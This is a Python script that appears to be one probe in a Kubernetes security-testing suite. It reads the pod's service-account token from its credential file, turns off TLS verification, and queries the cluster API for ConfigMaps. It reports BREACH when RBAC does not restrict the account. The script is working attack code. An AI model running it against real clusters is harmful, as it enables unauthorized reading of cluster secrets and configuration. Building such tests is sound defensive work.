#!/usr/bin/env python3
"""Attack: sec_configmap_read — Query K8s API for ConfigMaps using SA token"""
import json, os, socket, ssl, sys, time

def run():
    result = {"vector": "sec_configmap_read", "category": "secrets",
              "status": "HELD", "evidence": "", "duration_ms": 0}
    start = time.time()
    api_path = os.environ.get("TARGET_PATH", "/api/v1/namespaces/default/configmaps")
    api_host = "10.96.0.1"
    api_port = 443

    print(json.dumps({"type": "log", "line": f"querying K8s API: GET {api_path}"}))
    sys.stdout.flush()

    try:
        with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
            token = f.read().strip()

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = socket.create_connection((api_host, api_port), timeout=5)
        ssock = ctx.wrap_socket(sock, server_hostname=api_host)
        request = (f"GET {api_path} HTTP/1.1\r\nHost: {api_host}\r\n"
                   f"Authorization: Bearer {token}\r\nConnection: close\r\n\r\n")
        ssock.send(request.encode())
        resp = ssock.recv(512).decode(errors="replace")
        ssock.close()

        if "200 OK" in resp:
            result["status"] = "BREACH"
            result["evidence"] = f"ConfigMap listing returned — RBAC not restricting SA"
        else:
            result["evidence"] = f"K8s API reachable but RBAC denied: {resp[:60]}"
    except FileNotFoundError:
        result["evidence"] = "no SA token — cannot authenticate to K8s API"
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        result["evidence"] = f"K8s API unreachable — {e}"

    result["duration_ms"] = int((time.time() - start) * 1000)
    print(json.dumps({"type": "result", **result}))
    sys.stdout.flush()

if __name__ == "__main__":
    run()
